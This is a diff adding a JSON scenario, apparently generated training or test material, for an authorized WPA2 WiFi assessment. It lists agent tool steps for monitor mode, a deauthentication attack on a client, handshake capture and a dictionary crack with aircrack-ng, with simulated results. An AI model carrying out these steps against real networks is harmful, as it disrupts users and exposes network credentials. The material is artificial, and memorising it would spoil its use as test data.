@@ -1,0 +1,89 @@
+{
+  "title": "Corporate WiFi Security Assessment - WPA2 Handshake Capture",
+  "description": "Authorized security assessment of corporate WiFi network to test WPA2 password strength. Penetration tester captures WPA2 handshake using deauthentication attack and attempts password recovery using dictionary attack.",
+  "difficulty": "intermediate",
+  "scenario": "TechCorp hired your security firm to assess their office WiFi security. They suspect their WPA2 password may be vulnerable to dictionary attacks. Your goal is to capture the WPA2 handshake and test password strength using aircrack-ng suite.",
+  "steps": [
+    {
+      "step_number": 1,
+      "tool": "airmon_ng_monitor_mode",
+      "action": "Enable monitor mode on wireless adapter to begin WiFi reconnaissance",
+      "parameters": {"interface": "wlan0"},
+      "expected_result": "Monitor mode enabled on wlan0mon - ready for packet capture",
+      "explanation": "Monitor mode allows the wireless card to capture all WiFi traffic in the air, not just traffic destined for this machine"
+    },
+    {
+      "step_number": 2,
+      "tool": "airodump_ng_capture_scan",
+      "action": "Scan all WiFi networks in range to identify target network",
+      "parameters": {"interface": "wlan0", "scan_type": "general"},
+      "expected_result": "Discovered 15 access points - Target 'TechCorp-Office' on channel 6 with 8 connected clients, BSSID AA:BB:CC:DD:EE:FF",
+      "explanation": "General scan reveals all nearby networks with their security type, channel, signal strength, and number of connected clients"
+    },
+    {
+      "step_number": 3,
+      "tool": "airodump_ng_capture_scan",
+      "action": "Focus capture on target network to monitor for WPA handshakes",
+      "parameters": {"interface": "wlan0", "bssid": "AA:BB:CC:DD:EE:FF", "channel": "6", "output_file": "techcorp_capture"},
+      "expected_result": "Capturing packets on channel 6 - 3 clients active (11:22:33:44:55:66, 77:88:99:AA:BB:CC, DD:EE:FF:00:11:22)",
+      "explanation": "Focused capture on single channel reduces noise and increases chance of capturing complete WPA handshake"
+    },
+    {
+      "step_number": 4,
+      "tool": "aireplay_ng_deauth_attack",
+      "action": "Send targeted deauthentication to client to force reconnection and capture handshake",
+      "parameters": {"interface": "wlan0", "bssid": "AA:BB:CC:DD:EE:FF", "client": "11:22:33:44:55:66"},
+      "expected_result": "Sent 10 deauth packets to client 11:22:33:44:55:66 - Client disconnected and reconnecting",
+      "explanation": "Deauth forces client to disconnect and reauthenticate, during which the 4-way WPA handshake is captured"
+    },
+    {
+      "step_number": 5,
+      "tool": "airodump_ng_capture_scan",
+      "action": "Verify WPA handshake was successfully captured",
+      "parameters": {"interface": "wlan0", "bssid": "AA:BB:CC:DD:EE:FF", "channel": "6", "output_file": "techcorp_capture"},
+      "expected_result": "WPA handshake captured! Display shows 'WPA handshake: AA:BB:CC:DD:EE:FF' in top-right corner",
+      "explanation": "Successful handshake capture indicated by airodump-ng - can now stop capture and proceed to cracking"
+    },
+    {
+      "step_number": 6,
+      "tool": "airmon_ng_monitor_mode",
+      "action": "Disable monitor mode and restore normal operation",
+      "parameters": {"interface": "wlan0"},
+      "expected_result": "Monitor mode disabled - wlan0mon stopped, wlan0 restored to managed mode",
+      "explanation": "Cleanup step to return wireless adapter to normal state after capture complete"
+    },
+    {
+      "step_number": 7,
+      "tool": "aircrack_ng_wpa_crack",
+      "action": "Attempt to crack WPA2 password using rockyou wordlist",
+      "parameters": {"capture_file": "techcorp_capture-01.cap", "wordlist": "/usr/share/wordlists/rockyou.txt", "bssid": "AA:BB:CC:DD:EE:FF"},
+      "expected_result": "KEY FOUND! [ TechCorp2019! ] - Password cracked after testing 3,847,291 keys in 4 minutes 35 seconds",
+      "explanation": "Successful dictionary attack reveals weak password - demonstrates need for stronger password policy"
+    },
+    {
+      "step_number": 8,
+      "tool": "aircrack_ng_wpa_crack",
+      "action": "Save cracked password to report file for client documentation",
+      "parameters": {"capture_file": "techcorp_capture-01.cap", "wordlist": "/usr/share/wordlists/rockyou.txt", "output_file": "cracked_key.txt"},
+      "expected_result": "Cracked password 'TechCorp2019!' saved to cracked_key.txt - ready for security report",
+      "explanation": "Documentation of findings for client report showing WiFi password vulnerability"
+    }
+  ],
+  "outcome": "Successfully demonstrated WPA2 password vulnerability. The corporate WiFi password 'TechCorp2019!' was found in a common wordlist, indicating weak password policy. Recommended remediation: implement complex password with minimum 20 characters, mix of uppercase/lowercase/numbers/symbols, and not found in common wordlists. Consider WPA3 upgrade if hardware supports it.",
+  "learning_objectives": [
+    "Enable monitor mode for WiFi packet capture",
+    "Scan and identify target WiFi networks",
+    "Capture WPA2 4-way handshakes using focused airodump-ng",
+    "Force handshake capture with targeted deauthentication",
+    "Crack WPA2 passwords using dictionary attacks",
+    "Document security findings for client reports"
+  ],
+  "metadata": {
+    "created_by": "neural_mesh_v5.2_generator",
+    "category": "pentesting",
+    "subcategory": "wifi_security",
+    "tools_used": ["airmon_ng_monitor_mode", "airodump_ng_capture_scan", "aireplay_ng_deauth_attack", "aircrack_ng_wpa_crack"],
+    "estimated_time": "15-30 minutes",
+    "authorization_required": true
+  }
+}
